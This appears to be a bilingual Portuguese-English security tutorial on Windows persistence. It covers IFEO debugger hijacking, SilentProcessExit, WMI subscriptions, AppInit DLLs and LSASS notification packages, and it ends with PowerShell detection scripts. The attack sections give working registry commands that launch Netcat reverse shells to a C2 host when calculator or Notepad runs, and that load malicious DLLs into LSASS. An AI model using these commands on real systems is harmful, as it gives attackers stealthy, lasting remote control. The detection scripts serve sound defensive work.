2. Contexto e Relevância / Context and Relevance Original

A persistência em Windows é um jogo de gato e rato. O Windows fornece mecanismos legítimos que podem ser transformados em formas de garantir que código malicioso corre repetidamente após reboot ou logon. O que os torna atrativos é a durabilidade: uma vez configurados, sobrevivem a reinícios e fornecem execução repetida sem que o atacante tenha de reentrar manualmente no ambiente. Persistence on Windows is a cat-and-mouse game. Windows provides legitimate mechanisms that can be turned into ways to ensure malicious code runs repeatedly after reboot or logon. What makes them attractive is durability: once configured, they survive restarts and provide repeated execution without the attacker having to manually re-enter the environment.

3. IFEO Hijacking Original

O Windows permite definir um Debugger para um processo alvo, para que o Windows inicie a tua linha de comando sempre que o utilizador abrir esse programa. O binário original permanece intacto e é lançado normalmente, mas o comando Debugger pode prepender ou acrescentar comportamento adicional. Como a configuração vive em HKLM, persiste após reboots e não depende de autoruns ou scheduled tasks. Windows allows setting a Debugger for a target process, so Windows starts your command line whenever the user opens that program. The original binary remains intact and launches as usual, but the Debugger command can prepend or append additional behavior. Because the configuration lives in HKLM, it persists across reboots and doesn't rely on autoruns or scheduled tasks.

3.1 Execução / Execution

cmd#> copy calc.exe _calc.exe

cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & c:\windows\nc.exe -e c:\windows\system32\cmd.exe C2 9001" /f
O cmd /C executa primeiro _calc.exe (para o utilizador ver a calculadora normal) e, após este sair, executa o Netcat. O operador & garante que o segundo comando só corre após o primeiro terminar. cmd /C runs _calc.exe first (so the user sees the normal calculator), and after it exits, runs Netcat. The & operator ensures the second command only runs after the first finishes.
⚠️ Vantagens e desvantagens / Pros and cons:
Prós: persiste após reboots, deixa a aplicação original intacta, e dispara naturalmente quando o utilizador abre um programa específico. Contras: requer admin para HKLM, e é altamente visível porque valores Debugger não-desenvolvedor são um padrão de abuso conhecido. Pros: persists across reboots, leaves the original application intact, and triggers naturally when a user opens a specific program. Cons: requires admin for HKLM, and is highly visible because non-developer Debugger values are a known abuse pattern.

4. GFLAGS e SilentProcessExit Original

O Windows inclui funcionalidades de debugging e tracing que podem ser abusadas. O mecanismo SilentProcessExit permite configurar ações especiais quando um processo termina. Combinando com a definição GlobalFlag em IFEO, um atacante garante que, quando uma aplicação fecha, outro processo à sua escolha é lançado. Ao contrário de autoruns ou scheduled tasks, este método esconde-se na infraestrutura de diagnóstico do Windows. Windows includes debugging and tracing features that can be abused. The SilentProcessExit mechanism allows configuring special actions when a process terminates. Combined with the GlobalFlag setting in IFEO, an attacker ensures that when an application closes, another process of their choice is launched. Unlike autoruns or scheduled tasks, this method hides in Windows' diagnostic infrastructure.

4.1 Execução / Execution

cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512

cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1

cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "nc -e \windows\system32\cmd.exe C2 9001"
O primeiro comando define GlobalFlag=512 para o Notepad, ativando o monitor de "silent process exit". O segundo ativa o reporting. O terceiro especifica o comando a executar quando o Notepad fecha. Cada vez que o utilizador fecha o Notepad, o sistema dispara silenciosamente um reverse shell Netcat. The first command sets GlobalFlag=512 for Notepad, enabling the "silent process exit" monitor. The second enables reporting. The third specifies the command to run when Notepad closes. Each time the user closes Notepad, the system silently triggers a Netcat reverse shell.
Nota / Note:
Este método não é detetado por ferramentas comuns de auditoria de persistência como o Autoruns, porque depende de ramos de registo menos conhecidos (SilentProcessExit) em vez de Startup, Run keys ou serviços. This method is not detected by common persistence auditing tools like Autoruns, because it relies on lesser-known registry branches (SilentProcessExit) instead of Startup, Run keys, or services.

5. WMI Event Subscriptions Original

O WMI fornece um framework de monitorização e automação. Os atacantes podem abusar criando subscrições de eventos permanentes que vivem no repositório WMI e disparam payloads em timers ou eventos de sistema. Como estas subscrições são armazenadas no WMI em vez de chaves de registo óbvias ou pastas Startup, são mais furtivas e difíceis de detetar com ferramentas de inspeção casual. WMI provides a monitoring and automation framework. Attackers can abuse it by creating permanent event subscriptions that live in the WMI repository and trigger payloads on timers or system events. Because these subscriptions are stored in WMI rather than obvious registry keys or Startup folders, they are stealthier and harder to spot with casual inspection tools.

6. AppInit DLLs Original

O AppInit é uma funcionalidade legada do Windows que diz ao loader do OS para mapear uma ou mais DLLs em qualquer processo que ligue à user32.dll. Quando muitas aplicações GUI iniciam, o Windows carrega automaticamente as DLLs listadas nesse valor de registo, dando ao código dentro dessas DLLs a oportunidade de correr nesses processos. É um mecanismo de registo, machine-wide, que sobrevive a reboot e afeta aplicações GUI de 32 e 64-bit. AppInit is a legacy Windows feature that tells the OS loader to map one or more DLLs into any process that links to user32.dll. When many GUI apps start, Windows automatically loads the DLLs listed in that registry value, giving code inside those DLLs a chance to run in those processes. It's a registry-based, machine-wide mechanism that survives reboot and affects both 32-bit and 64-bit GUI applications.

6.1 Execução / Execution

cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f

cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "C:\meter64.dll" /f

cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f

cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "C:\meter32.dll" /f
Os primeiros dois comandos ativam o AppInit e definem a DLL para processos de 64-bit. Os dois seguintes fazem o mesmo para o Wow6432Node (32-bit). O resultado é que aplicações GUI de ambas as arquiteturas carregam as DLLs especificadas. The first two commands enable AppInit and set the DLL for 64-bit processes. The next two do the same for Wow6432Node (32-bit). The result is that GUI applications of both architectures load the specified DLLs.

7. LSASS Notification Packages Original

Modificar a configuração do LSASS para carregar uma DLL extra é uma forma de obter execução de código dentro de um processo altamente privilegiado e de longa duração. O LSASS carrega pacotes de autenticação/notificação configurados no arranque; adicionar uma entrada aqui faz com que o módulo escolhido seja carregado nesse processo e permaneça ativo após reboots. Modifying LSASS configuration to load an extra DLL is a way to get code execution inside a highly privileged, long-lived process. LSASS loads configured authentication/notification packages at startup; adding an entry here causes the chosen module to be loaded into that process and remain active across reboots.

7.1 Execução / Execution

cmd#> reg add "HKLM\system\currentcontrolset\control\lsa" /v "Notification Packages" /t reg_multi_sz /d "rassfm\0scecli\0meter" /f
Este comando diz ao Windows: "quando o LSASS iniciar, carrega também os pacotes rassfm, scecli e meter". O meter é a DLL maliciosa. This command tells Windows: "when LSASS starts, also load the packages rassfm, scecli, and meter". meter is the malicious DLL.
⚠️ Risco / Risk:
Esta técnica coloca código dentro de um processo de longa duração e alto privilégio, mas uma DLL mal configurada ou com bugs pode crashar o LSASS, destabilizando ou tornando o sistema inutilizável. É altamente suspeita para defensores. This technique places code inside a long-running, high-privilege process, but a misconfigured or buggy DLL can crash LSASS, destabilizing or rendering the system unusable. It's highly suspicious to defenders.

8. Scripts de Impacto / Impact Scripts Impacto Complementar

8.1 Script 22.1 — Deteção de IFEO Debugger / IFEO Debugger Detection

# Script 22.1 - IFEO Debugger Detection
$out = ".\ifeo-detect.csv"
$base = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
$hits = @()
Get-ChildItem $base -EA SilentlyContinue | ForEach-Object {
  $debugger = (Get-ItemProperty $_.PSPath -Name "Debugger" -EA SilentlyContinue).Debugger
  if ($debugger) {
    $hits += [PSCustomObject]@{ Process=$_.PSChildName; Debugger=$debugger; Severity="CRITICAL" }
  }
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] IFEO Debugger entries: $($hits.Count) -> $out" -ForegroundColor Red
$hits | Format-Table -AutoSize

8.2 Script 22.2 — Deteção de GFLAGS/SilentProcessExit / GFLAGS Detection

# Script 22.2 - GFLAGS/SilentProcessExit Detection
$out = ".\gflags-detect.csv"
$base = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit"
$hits = @()
Get-ChildItem $base -EA SilentlyContinue | ForEach-Object {
  $monitor = (Get-ItemProperty $_.PSPath -Name "MonitorProcess" -EA SilentlyContinue).MonitorProcess
  $report = (Get-ItemProperty $_.PSPath -Name "ReportingMode" -EA SilentlyContinue).ReportingMode
  if ($monitor -or $report) {
    $hits += [PSCustomObject]@{ Process=$_.PSChildName; MonitorProcess=$monitor; ReportingMode=$report; Severity="HIGH" }
  }
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] SilentProcessExit entries: $($hits.Count) -> $out" -ForegroundColor Red
$hits | Format-Table -AutoSize

8.3 Script 22.3 — Deteção de AppInit DLLs / AppInit Detection

# Script 22.3 - AppInit DLLs Detection
$out = ".\appinit-detect.csv"
$keys = @(
  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows",
  "HKLM:\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows"
)
$hits = @()
foreach ($k in $keys) {
  $load = (Get-ItemProperty $k -Name "LoadAppInit_DLLs" -EA SilentlyContinue).LoadAppInit_DLLs
  $dlls = (Get-ItemProperty $k -Name "AppInit_DLLs" -EA SilentlyContinue).AppInit_DLLs
  if ($load -eq 1 -and $dlls) {
    $hits += [PSCustomObject]@{ Path=$k; LoadAppInit_DLLs=$load; AppInit_DLLs=$dlls; Severity="CRITICAL" }
  }
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] AppInit entries: $($hits.Count) -> $out" -ForegroundColor Red

8.4 Script 22.4 — Deteção de LSASS Packages / LSASS Detection

# Script 22.4 - LSASS Notification Packages Detection
$out = ".\lsass-packages.csv"
$key = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
$packages = (Get-ItemProperty $key -Name "Notification Packages" -EA SilentlyContinue)."Notification Packages"
$expected = @("rassfm","scecli")
$hits = @()
if ($packages) {
  foreach ($p in $packages) {
    if ($p -notin $expected -and $p -ne "") {
      $hits += [PSCustomObject]@{ Package=$p; Severity="CRITICAL" }
    }
  }
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] Suspicious LSASS packages: $($hits.Count) -> $out" -ForegroundColor Red
